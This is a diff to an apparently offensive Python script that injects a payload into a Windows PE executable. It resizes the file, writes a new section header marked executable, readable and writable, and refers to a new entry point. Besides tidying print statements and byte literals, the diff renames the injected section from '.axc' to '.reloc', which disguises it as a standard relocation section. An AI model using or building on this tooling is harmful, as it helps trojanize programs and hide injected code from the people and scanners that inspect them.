@@ -78,21 +78,21 @@ def create_payload(x, y, z, new_entry_point, rel_virtual_address):
 try:
     # STEP 0x01 - Resize the Executable
     # Note: I added some more space to avoid error
-    print ("[*] STEP 0x01 - Resize the Executable")
+    print("[*] STEP 0x01 - Resize the Executable")
 
     original_size = os.path.getsize(path)
-    print ("\t[+] Original Size = %d" % original_size)
+    print("\t[+] Original Size = %d" % original_size)
     fd = open(path, 'a+b')
     map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
     map.resize(original_size + 0x2000)
     map.close()
     fd.close()
 
-    print ("\t[+] New Size = %d bytes\n" % os.path.getsize(path))
-    
-    print ("\n[*] STEP 0x02 - Add the New Section Header")
+    print("\t[+] New Size = %d bytes\n" % os.path.getsize(path))
+
+    print("\n[*] STEP 0x02 - Add the New Section Header")
     print("\nnew section_offset: ", hex(new_section_offset))
-    
+
     # Get the header section of pe file
     # get the va_offset, raw_offset
     virtual_offset, raw_offset = get_virtual_raw_offset(pe)
@@ -109,25 +109,37 @@ try:
     print('\nEntry point va: ', hex(entry_point_va))
 
     # CODE | EXECUTE | READ | WRITE
-    characteristics = 0xE0000020 
+    characteristics = 0xE0000020
     # Section name must be equal to 8 bytes
-    name = ".axc" + (4 * b'\x00')
-    
+    name = b".reloc" + (4 * b'\x00')
+
     # Create the section
     # Set the name
     pe.set_bytes_at_offset(new_section_offset, name)
+    print("\tSection name: ", name)
+    
     # Set the virtual size
     pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
+    print("\tVirtual size: ", hex(virtual_size))
+    
     # Set the virtual offset
     pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
+    print("\tVirtual offset: ", hex(virtual_offset))
+    
     # Set the raw size
     pe.set_dword_at_offset(new_section_offset + 16, raw_size)
+    print("\tRaw size: ", hex(raw_size))
+    
     # Set the raw offset
     pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
+    print("\tRaw offset: ", hex(raw_offset))
+    
     # Set the following fields to zero
-    pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
+    pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))
+    
     # Set the characteristics
     pe.set_dword_at_offset(new_section_offset + 36, characteristics)
+    print("Characteristics = ", hex(characteristics))
 
 finally:
     print("\nDone")
